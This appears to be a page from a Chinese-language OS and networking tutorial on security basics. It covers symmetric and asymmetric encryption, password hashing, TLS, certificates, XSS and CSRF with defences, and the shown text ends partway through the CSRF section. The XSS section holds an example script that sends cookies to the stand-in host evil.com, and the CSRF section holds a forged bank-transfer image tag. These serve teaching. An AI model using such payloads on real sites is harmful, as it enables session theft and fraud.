

<!DOCTYPE html>
<html class="writer-html5" lang="en">
<head>
  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />

  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>ç½‘ç»œå®‰å…¨åŸºç¡€ &mdash; OS &amp; Network Core 1.0.0 documentation</title>
      <link rel="stylesheet" type="text/css" href="../_static/pygments.css?v=b86133f3" />
      <link rel="stylesheet" type="text/css" href="../_static/css/theme.css?v=e59714d7" />
      <link rel="stylesheet" type="text/css" href="../_static/custom.css?v=2d0851c8" />

  
    <link rel="shortcut icon" href="../_static/favicon.ico"/>
      <script src="../_static/jquery.js?v=5d32c60e"></script>
      <script src="../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
      <script data-url_root="../" id="documentation_options" src="../_static/documentation_options.js?v=af2ce170"></script>
      <script src="../_static/doctools.js?v=888ff710"></script>
      <script src="../_static/sphinx_highlight.js?v=4825356b"></script>
      <script src="../_static/copy-code.js?v=caf91246"></script>
    <script src="../_static/js/theme.js"></script>
    <link rel="index" title="Index" href="../genindex.html" />
    <link rel="search" title="Search" href="../search.html" />
    <link rel="prev" title="ç½‘ç»œå®‰å…¨åŸºç¡€" href="index.html" /> 
</head>

<body class="wy-body-for-nav"> 
  <div class="wy-grid-for-nav">
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search"  style="background: #2980B9" >

          
          
          <a href="../index.html" class="icon icon-home">
            OS & Network Core
          </a>
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>
        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
              <p class="caption" role="heading"><span class="caption-text">ç›®å½•</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="../introduction.html">OS &amp; Network Core</a></li>
<li class="toctree-l1"><a class="reference internal" href="../01-process-thread/index.html">è¿›ç¨‹ä¸çº¿ç¨‹</a></li>
<li class="toctree-l1"><a class="reference internal" href="../02-process-scheduling/index.html">è¿›ç¨‹è°ƒåº¦</a></li>
<li class="toctree-l1"><a class="reference internal" href="../03-memory-management/index.html">å†…å­˜ç®¡ç†</a></li>
<li class="toctree-l1"><a class="reference internal" href="../04-file-system/index.html">æ–‡ä»¶ç³»ç»Ÿ</a></li>
<li class="toctree-l1"><a class="reference internal" href="../05-concurrency-sync/index.html">å¹¶å‘ä¸åŒæ­¥</a></li>
<li class="toctree-l1"><a class="reference internal" href="../06-deadlock/index.html">æ­»é”å¤„ç†</a></li>
<li class="toctree-l1"><a class="reference internal" href="../07-tcp-ip/index.html">TCP-IPåè®®è¯¦è§£</a></li>
<li class="toctree-l1"><a class="reference internal" href="../08-http/index.html">HTTPåè®®ä¸å®æˆ˜</a></li>
<li class="toctree-l1"><a class="reference internal" href="../09-socket/index.html">Socketç¼–ç¨‹å®æˆ˜</a></li>
<li class="toctree-l1"><a class="reference internal" href="../10-network-tools/index.html">ç½‘ç»œå·¥å…·å¤§å…¨</a></li>
<li class="toctree-l1 current"><a class="reference internal" href="index.html">ç½‘ç»œå®‰å…¨åŸºç¡€</a><ul class="current">
<li class="toctree-l2 current"><a class="current reference internal" href="#">ç½‘ç»œå®‰å…¨åŸºç¡€</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id2">ğŸ’¡ æ ¸å¿ƒç»“è®º</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id3">1. åŠ å¯†æŠ€æœ¯</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#id4">1.1 å¯¹ç§°åŠ å¯†</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id5">1.2 éå¯¹ç§°åŠ å¯†</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id6">1.3 å“ˆå¸Œå‡½æ•°</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#https-tls">2. HTTPS/TLS</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#tls">2.1 TLSæ¡æ‰‹è¿‡ç¨‹</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id7">2.2 è¯ä¹¦é“¾</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id8">2.3 ç”Ÿæˆè‡ªç­¾åè¯ä¹¦</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#web">3. Webå®‰å…¨</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#xss">3.1 XSSï¼ˆè·¨ç«™è„šæœ¬æ”»å‡»ï¼‰</a></li>
<li class="toctree-l4"><a class="reference internal" href="#csrf">3.2 CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰</a></li>
<li class="toctree-l4"><a class="reference internal" href="#sql">3.3 SQLæ³¨å…¥</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id9">3.4 å‘½ä»¤æ³¨å…¥</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id10">4. èº«ä»½è®¤è¯</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#session">4.1 Sessionè®¤è¯</a></li>
<li class="toctree-l4"><a class="reference internal" href="#jwt">4.2 JWTè®¤è¯</a></li>
<li class="toctree-l4"><a class="reference internal" href="#oauth-2-0">4.3 OAuth 2.0</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id11">5. å¸¸è§å®‰å…¨å¤´éƒ¨</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id12">6. é˜²ç«å¢™å’Œç«¯å£ç®¡ç†</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#iptables">6.1 iptables</a></li>
<li class="toctree-l4"><a class="reference internal" href="#ufw-ubuntu">6.2 ufwï¼ˆUbuntuï¼‰</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id13">7. å®‰å…¨æ‰«æå·¥å…·</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#nikto-web">7.1 Niktoï¼ˆWebæ‰«æï¼‰</a></li>
<li class="toctree-l4"><a class="reference internal" href="#owasp-zap">7.2 OWASP ZAP</a></li>
<li class="toctree-l4"><a class="reference internal" href="#sqlmap-sql">7.3 SQLMapï¼ˆSQLæ³¨å…¥æµ‹è¯•ï¼‰</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id14">8. æœ€ä½³å®è·µ</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#id15">8.1 å¯†ç å®‰å…¨</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id16">8.2 è¾“å…¥éªŒè¯</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id17">8.3 æ—¥å¿—å’Œç›‘æ§</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id18">9. å¸¸è§é—®é¢˜</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#q1-https">Q1: HTTPSå°±ä¸€å®šå®‰å…¨å—ï¼Ÿ</a></li>
<li class="toctree-l4"><a class="reference internal" href="#q2-jwt-vs-session">Q2: JWT vs Sessionï¼Ÿ</a></li>
<li class="toctree-l4"><a class="reference internal" href="#q3-ddos">Q3: å¦‚ä½•é˜²æ­¢DDoSï¼Ÿ</a></li>
<li class="toctree-l4"><a class="reference internal" href="#q4">Q4: å®‰å…¨æ›´æ–°é¢‘ç‡ï¼Ÿ</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id19">å‚è€ƒèµ„æº</a></li>
</ul>
</li>
</ul>
</li>
</ul>

        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu"  style="background: #2980B9" >
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../index.html">OS & Network Core</a>
      </nav>

      <div class="wy-nav-content">
        <div class="rst-content">
          <div role="navigation" aria-label="Page navigation">
  <ul class="wy-breadcrumbs">
      <li><a href="../index.html" class="icon icon-home" aria-label="Home"></a></li>
          <li class="breadcrumb-item"><a href="index.html">ç½‘ç»œå®‰å…¨åŸºç¡€</a></li>
      <li class="breadcrumb-item active">ç½‘ç»œå®‰å…¨åŸºç¡€</li>
      <li class="wy-breadcrumbs-aside">
            <a href="../_sources/11-network-security/README.md.txt" rel="nofollow"> View page source</a>
      </li>
  </ul>
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
             
  <section class="tex2jax_ignore mathjax_ignore" id="id1">
<h1>ç½‘ç»œå®‰å…¨åŸºç¡€<a class="headerlink" href="#id1" title="Permalink to this heading">ïƒ</a></h1>
<section id="id2">
<h2>ğŸ’¡ æ ¸å¿ƒç»“è®º<a class="headerlink" href="#id2" title="Permalink to this heading">ïƒ</a></h2>
<ol class="arabic simple">
<li><p><strong>å¯¹ç§°åŠ å¯†å¿«ä½†å¯†é’¥äº¤æ¢å›°éš¾ï¼Œéå¯¹ç§°åŠ å¯†æ…¢ä½†å®‰å…¨</strong></p></li>
<li><p><strong>HTTPSé€šè¿‡TLSæä¾›åŠ å¯†ã€å®Œæ•´æ€§å’Œèº«ä»½éªŒè¯</strong></p></li>
<li><p><strong>é˜²æ­¢XSSéœ€è½¬ä¹‰è¾“å‡ºï¼Œé˜²æ­¢CSRFéœ€éªŒè¯æ¥æº</strong></p></li>
<li><p><strong>SQLæ³¨å…¥é€šè¿‡å‚æ•°åŒ–æŸ¥è¯¢é¢„é˜²ï¼Œå‘½ä»¤æ³¨å…¥éœ€ä¸¥æ ¼è¿‡æ»¤</strong></p></li>
<li><p><strong>é˜²ç«å¢™ã€å…¥ä¾µæ£€æµ‹å’Œå®šæœŸæ›´æ–°æ˜¯å®‰å…¨é˜²æŠ¤çš„åŸºç¡€</strong></p></li>
</ol>
</section>
<hr class="docutils" />
<section id="id3">
<h2>1. åŠ å¯†æŠ€æœ¯<a class="headerlink" href="#id3" title="Permalink to this heading">ïƒ</a></h2>
<section id="id4">
<h3>1.1 å¯¹ç§°åŠ å¯†<a class="headerlink" href="#id4" title="Permalink to this heading">ïƒ</a></h3>
<p><strong>åŸç†</strong>ï¼šåŠ å¯†å’Œè§£å¯†ä½¿ç”¨åŒä¸€ä¸ªå¯†é’¥</p>
<p><strong>å¸¸ç”¨ç®—æ³•</strong>ï¼š</p>
<ul class="simple">
<li><p><strong>AES</strong>ï¼šé«˜çº§åŠ å¯†æ ‡å‡†ï¼ˆæ¨èï¼‰</p></li>
<li><p><strong>DES</strong>ï¼šæ•°æ®åŠ å¯†æ ‡å‡†ï¼ˆå·²è¿‡æ—¶ï¼‰</p></li>
<li><p><strong>3DES</strong>ï¼šä¸‰é‡DES</p></li>
<li><p><strong>ChaCha20</strong>ï¼šæµåŠ å¯†</p></li>
</ul>
<p><strong>AESç¤ºä¾‹ï¼ˆPythonï¼‰</strong>ï¼š</p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.Cipher</span><span class="w"> </span><span class="kn">import</span> <span class="n">AES</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.Random</span><span class="w"> </span><span class="kn">import</span> <span class="n">get_random_bytes</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.Util.Padding</span><span class="w"> </span><span class="kn">import</span> <span class="n">pad</span><span class="p">,</span> <span class="n">unpad</span>

<span class="c1"># åŠ å¯†</span>
<span class="n">key</span> <span class="o">=</span> <span class="n">get_random_bytes</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>  <span class="c1"># 256ä½å¯†é’¥</span>
<span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">)</span>
<span class="n">plaintext</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;Secret message&quot;</span>
<span class="n">ciphertext</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">pad</span><span class="p">(</span><span class="n">plaintext</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">block_size</span><span class="p">))</span>
<span class="n">iv</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">iv</span>

<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;å¯†æ–‡: </span><span class="si">{</span><span class="n">ciphertext</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="c1"># è§£å¯†</span>
<span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="o">=</span><span class="n">iv</span><span class="p">)</span>
<span class="n">decrypted</span> <span class="o">=</span> <span class="n">unpad</span><span class="p">(</span><span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">),</span> <span class="n">AES</span><span class="o">.</span><span class="n">block_size</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;æ˜æ–‡: </span><span class="si">{</span><span class="n">decrypted</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</pre></div>
</div>
<p><strong>ç‰¹ç‚¹</strong>ï¼š</p>
<ul class="simple">
<li><p>âœ… é€Ÿåº¦å¿«</p></li>
<li><p>âœ… é€‚åˆå¤§é‡æ•°æ®åŠ å¯†</p></li>
<li><p>âŒ å¯†é’¥äº¤æ¢å›°éš¾</p></li>
<li><p>âŒ å¯†é’¥æ³„éœ²åˆ™å…¨éƒ¨æ³„éœ²</p></li>
</ul>
</section>
<section id="id5">
<h3>1.2 éå¯¹ç§°åŠ å¯†<a class="headerlink" href="#id5" title="Permalink to this heading">ïƒ</a></h3>
<p><strong>åŸç†</strong>ï¼šå…¬é’¥åŠ å¯†ï¼Œç§é’¥è§£å¯†</p>
<p><strong>å¸¸ç”¨ç®—æ³•</strong>ï¼š</p>
<ul class="simple">
<li><p><strong>RSA</strong>ï¼šæœ€å¸¸ç”¨</p></li>
<li><p><strong>ECC</strong>ï¼šæ¤­åœ†æ›²çº¿åŠ å¯†ï¼ˆæ›´çŸ­çš„å¯†é’¥ï¼‰</p></li>
<li><p><strong>DSA</strong>ï¼šæ•°å­—ç­¾å</p></li>
</ul>
<p><strong>RSAç¤ºä¾‹ï¼ˆPythonï¼‰</strong>ï¼š</p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.PublicKey</span><span class="w"> </span><span class="kn">import</span> <span class="n">RSA</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.Cipher</span><span class="w"> </span><span class="kn">import</span> <span class="n">PKCS1_OAEP</span>

<span class="c1"># ç”Ÿæˆå¯†é’¥å¯¹</span>
<span class="n">key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">generate</span><span class="p">(</span><span class="mi">2048</span><span class="p">)</span>
<span class="n">private_key</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">export_key</span><span class="p">()</span>
<span class="n">public_key</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">publickey</span><span class="p">()</span><span class="o">.</span><span class="n">export_key</span><span class="p">()</span>

<span class="c1"># åŠ å¯†</span>
<span class="n">recipient_key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">import_key</span><span class="p">(</span><span class="n">public_key</span><span class="p">)</span>
<span class="n">cipher</span> <span class="o">=</span> <span class="n">PKCS1_OAEP</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">recipient_key</span><span class="p">)</span>
<span class="n">ciphertext</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Secret message&quot;</span><span class="p">)</span>

<span class="c1"># è§£å¯†</span>
<span class="n">private_key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">import_key</span><span class="p">(</span><span class="n">private_key</span><span class="p">)</span>
<span class="n">cipher</span> <span class="o">=</span> <span class="n">PKCS1_OAEP</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">private_key</span><span class="p">)</span>
<span class="n">plaintext</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">)</span>
</pre></div>
</div>
<p><strong>ç‰¹ç‚¹</strong>ï¼š</p>
<ul class="simple">
<li><p>âœ… å¯†é’¥äº¤æ¢å®‰å…¨</p></li>
<li><p>âœ… æ”¯æŒæ•°å­—ç­¾å</p></li>
<li><p>âŒ é€Ÿåº¦æ…¢</p></li>
<li><p>âŒ ä¸é€‚åˆå¤§é‡æ•°æ®</p></li>
</ul>
</section>
<section id="id6">
<h3>1.3 å“ˆå¸Œå‡½æ•°<a class="headerlink" href="#id6" title="Permalink to this heading">ïƒ</a></h3>
<p><strong>åŸç†</strong>ï¼šå°†ä»»æ„é•¿åº¦æ•°æ®æ˜ å°„ä¸ºå›ºå®šé•¿åº¦</p>
<p><strong>å¸¸ç”¨ç®—æ³•</strong>ï¼š</p>
<ul class="simple">
<li><p><strong>SHA-256</strong>ï¼šå®‰å…¨å“ˆå¸Œç®—æ³•ï¼ˆæ¨èï¼‰</p></li>
<li><p><strong>SHA-3</strong>ï¼šæœ€æ–°æ ‡å‡†</p></li>
<li><p><strong>MD5</strong>ï¼šå·²ä¸å®‰å…¨ï¼Œä»…ç”¨äºæ ¡éªŒ</p></li>
<li><p><strong>bcrypt</strong>ï¼šå¯†ç å“ˆå¸Œï¼ˆå¸¦ç›å€¼ï¼‰</p></li>
</ul>
<p><strong>å¯†ç å“ˆå¸Œç¤ºä¾‹</strong>ï¼š</p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span><span class="w"> </span><span class="nn">bcrypt</span>

<span class="c1"># æ³¨å†Œæ—¶ï¼šå“ˆå¸Œå¯†ç </span>
<span class="n">password</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;user_password&quot;</span>
<span class="n">salt</span> <span class="o">=</span> <span class="n">bcrypt</span><span class="o">.</span><span class="n">gensalt</span><span class="p">()</span>
<span class="n">hashed</span> <span class="o">=</span> <span class="n">bcrypt</span><span class="o">.</span><span class="n">hashpw</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="n">salt</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Hashed: </span><span class="si">{</span><span class="n">hashed</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="c1"># ç™»å½•æ—¶ï¼šéªŒè¯å¯†ç </span>
<span class="k">if</span> <span class="n">bcrypt</span><span class="o">.</span><span class="n">checkpw</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="n">hashed</span><span class="p">):</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Password correct!&quot;</span><span class="p">)</span>
</pre></div>
</div>
<p><strong>ç‰¹ç‚¹</strong>ï¼š</p>
<ul class="simple">
<li><p>âœ… å•å‘å‡½æ•°ï¼ˆä¸å¯é€†ï¼‰</p></li>
<li><p>âœ… å›ºå®šé•¿åº¦è¾“å‡º</p></li>
<li><p>âœ… å¾®å°æ”¹å˜å¯¼è‡´å®Œå…¨ä¸åŒçš„å“ˆå¸Œå€¼</p></li>
<li><p>ç”¨é€”ï¼šå¯†ç å­˜å‚¨ã€æ–‡ä»¶æ ¡éªŒã€æ•°å­—ç­¾å</p></li>
</ul>
</section>
</section>
<hr class="docutils" />
<section id="https-tls">
<h2>2. HTTPS/TLS<a class="headerlink" href="#https-tls" title="Permalink to this heading">ïƒ</a></h2>
<section id="tls">
<h3>2.1 TLSæ¡æ‰‹è¿‡ç¨‹<a class="headerlink" href="#tls" title="Permalink to this heading">ïƒ</a></h3>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mf">1.</span> <span class="n">Client</span> <span class="n">Hello</span>
   <span class="o">-</span> <span class="n">æ”¯æŒçš„TLSç‰ˆæœ¬</span>
   <span class="o">-</span> <span class="n">æ”¯æŒçš„åŠ å¯†å¥—ä»¶</span>
   <span class="o">-</span> <span class="n">éšæœºæ•°</span>

<span class="mf">2.</span> <span class="n">Server</span> <span class="n">Hello</span>
   <span class="o">-</span> <span class="n">é€‰æ‹©çš„TLSç‰ˆæœ¬</span>
   <span class="o">-</span> <span class="n">é€‰æ‹©çš„åŠ å¯†å¥—ä»¶</span>
   <span class="o">-</span> <span class="n">éšæœºæ•°</span>
   <span class="o">-</span> <span class="n">æœåŠ¡å™¨è¯ä¹¦</span>

<span class="mf">3.</span> <span class="n">å®¢æˆ·ç«¯éªŒè¯è¯ä¹¦</span>
   <span class="o">-</span> <span class="n">æ£€æŸ¥æœ‰æ•ˆæœŸ</span>
   <span class="o">-</span> <span class="n">æ£€æŸ¥ç­¾å</span>
   <span class="o">-</span> <span class="n">æ£€æŸ¥åŸŸå</span>

<span class="mf">4.</span> <span class="n">å¯†é’¥äº¤æ¢</span>
   <span class="o">-</span> <span class="n">å®¢æˆ·ç«¯ç”ŸæˆPre</span><span class="o">-</span><span class="n">Master</span> <span class="n">Secret</span>
   <span class="o">-</span> <span class="n">ç”¨æœåŠ¡å™¨å…¬é’¥åŠ å¯†</span>
   <span class="o">-</span> <span class="n">å‘é€ç»™æœåŠ¡å™¨</span>

<span class="mf">5.</span> <span class="n">ç”Ÿæˆä¼šè¯å¯†é’¥</span>
   <span class="n">Master</span> <span class="n">Secret</span> <span class="o">=</span> <span class="n">PRF</span><span class="p">(</span><span class="n">Pre</span><span class="o">-</span><span class="n">Master</span><span class="p">,</span> <span class="n">Client</span> <span class="n">Random</span><span class="p">,</span> <span class="n">Server</span> <span class="n">Random</span><span class="p">)</span>

<span class="mf">6.</span> <span class="n">å¼€å§‹åŠ å¯†é€šä¿¡</span>
   <span class="n">ä½¿ç”¨Master</span> <span class="n">Secretæ´¾ç”Ÿçš„å¯¹ç§°å¯†é’¥</span>
</pre></div>
</div>
</section>
<section id="id7">
<h3>2.2 è¯ä¹¦é“¾<a class="headerlink" href="#id7" title="Permalink to this heading">ïƒ</a></h3>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Root CA (æ ¹è¯ä¹¦)
  ç­¾å â†“
Intermediate CA (ä¸­é—´è¯ä¹¦)
  ç­¾å â†“
Server Certificate (æœåŠ¡å™¨è¯ä¹¦)
</pre></div>
</div>
<p><strong>éªŒè¯è¯ä¹¦</strong>ï¼š</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># æŸ¥çœ‹è¯ä¹¦</span>
$<span class="w"> </span>openssl<span class="w"> </span>s_client<span class="w"> </span>-connect<span class="w"> </span>www.google.com:443<span class="w"> </span>-showcerts

<span class="c1"># éªŒè¯è¯ä¹¦é“¾</span>
$<span class="w"> </span>openssl<span class="w"> </span>verify<span class="w"> </span>-CAfile<span class="w"> </span>ca-bundle.crt<span class="w"> </span>server.crt

<span class="c1"># æŸ¥çœ‹è¯ä¹¦è¯¦æƒ…</span>
$<span class="w"> </span>openssl<span class="w"> </span>x509<span class="w"> </span>-in<span class="w"> </span>server.crt<span class="w"> </span>-text<span class="w"> </span>-noout
</pre></div>
</div>
</section>
<section id="id8">
<h3>2.3 ç”Ÿæˆè‡ªç­¾åè¯ä¹¦<a class="headerlink" href="#id8" title="Permalink to this heading">ïƒ</a></h3>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># ç”Ÿæˆç§é’¥</span>
$<span class="w"> </span>openssl<span class="w"> </span>genrsa<span class="w"> </span>-out<span class="w"> </span>server.key<span class="w"> </span><span class="m">2048</span>

<span class="c1"># ç”Ÿæˆè¯ä¹¦ç­¾åè¯·æ±‚ï¼ˆCSRï¼‰</span>
$<span class="w"> </span>openssl<span class="w"> </span>req<span class="w"> </span>-new<span class="w"> </span>-key<span class="w"> </span>server.key<span class="w"> </span>-out<span class="w"> </span>server.csr

<span class="c1"># ç”Ÿæˆè‡ªç­¾åè¯ä¹¦</span>
$<span class="w"> </span>openssl<span class="w"> </span>x509<span class="w"> </span>-req<span class="w"> </span>-days<span class="w"> </span><span class="m">365</span><span class="w"> </span>-in<span class="w"> </span>server.csr<span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-signkey<span class="w"> </span>server.key<span class="w"> </span>-out<span class="w"> </span>server.crt
</pre></div>
</div>
</section>
</section>
<hr class="docutils" />
<section id="web">
<h2>3. Webå®‰å…¨<a class="headerlink" href="#web" title="Permalink to this heading">ïƒ</a></h2>
<section id="xss">
<h3>3.1 XSSï¼ˆè·¨ç«™è„šæœ¬æ”»å‡»ï¼‰<a class="headerlink" href="#xss" title="Permalink to this heading">ïƒ</a></h3>
<p><strong>ç±»å‹</strong>ï¼š</p>
<ol class="arabic simple">
<li><p><strong>å­˜å‚¨å‹XSS</strong>ï¼šæ¶æ„è„šæœ¬å­˜å‚¨åœ¨æœåŠ¡å™¨</p></li>
<li><p><strong>åå°„å‹XSS</strong>ï¼šæ¶æ„è„šæœ¬åœ¨URLä¸­</p></li>
<li><p><strong>DOMå‹XSS</strong>ï¼šåœ¨å®¢æˆ·ç«¯æ‰§è¡Œ</p></li>
</ol>
<p><strong>æ”»å‡»ç¤ºä¾‹</strong>ï¼š</p>
<div class="highlight-html notranslate"><div class="highlight"><pre><span></span><span class="cm">&lt;!-- è¯„è®ºè¾“å…¥ --&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="w">  </span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="s1">&#39;http://evil.com/steal?cookie=&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span>
<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>

<span class="cm">&lt;!-- URLå‚æ•° --&gt;</span>
http://example.com/search?q=<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</pre></div>
</div>
<p><strong>é˜²å¾¡</strong>ï¼š</p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="c1"># 1. è¾“å‡ºè½¬ä¹‰</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">html</span><span class="w"> </span><span class="kn">import</span> <span class="n">escape</span>
<span class="n">user_input</span> <span class="o">=</span> <span class="s2">&quot;&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;&quot;</span>
<span class="n">safe_output</span> <span class="o">=</span> <span class="n">escape</span><span class="p">(</span><span class="n">user_input</span><span class="p">)</span>
<span class="c1"># &amp;lt;script&amp;gt;alert(&amp;#x27;XSS&amp;#x27;)&amp;lt;/script&amp;gt;</span>

<span class="c1"># 2. ä½¿ç”¨æ¨¡æ¿å¼•æ“è‡ªåŠ¨è½¬ä¹‰</span>
<span class="c1"># Jinja2, Reactç­‰é»˜è®¤è½¬ä¹‰</span>

<span class="c1"># 3. Content Security Policy (CSP)</span>
<span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Content-Security-Policy&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;default-src &#39;self&#39;&quot;</span>

<span class="c1"># 4. HttpOnly Cookie</span>
<span class="n">response</span><span class="o">.</span><span class="n">set_cookie</span><span class="p">(</span><span class="s1">&#39;session&#39;</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">httponly</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</section>
<section id="csrf">
<h3>3.2 CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰<a class="headerlink" href="#csrf" title="Permalink to this heading">ïƒ</a></h3>
<p><strong>æ”»å‡»ç¤ºä¾‹</strong>ï¼š</p>
<div class="highlight-html notranslate"><div class="highlight"><pre><span></span><span class="cm">&lt;!-- å—å®³è€…è®¿é—®æ¶æ„ç½‘ç«™ --&gt;</span>
<span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;http://bank.com/transfer?to=attacker&amp;amount=1000&quot;</span><span class="p">&gt;</span>

<span class="cm">&lt;!-- å—å®³è€…çš„Cookieè‡ªåŠ¨å‘é€ï¼Œè¯·æ±‚è¢«æ‰§è¡Œï¼ --&gt;</span>
</pre></div>
</div>
<p><strong>é˜²å¾¡</strong>ï¼š</p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="c1"># 1. CSRF Token</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">flask_wtf.csrf</span><span class="w"> </span><span class="kn">import</span> <span class="n">CSRFProtect</span>
<span class="n">csrf</span> <span class="o">=</span> <span class="n">CSRFProtect</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>

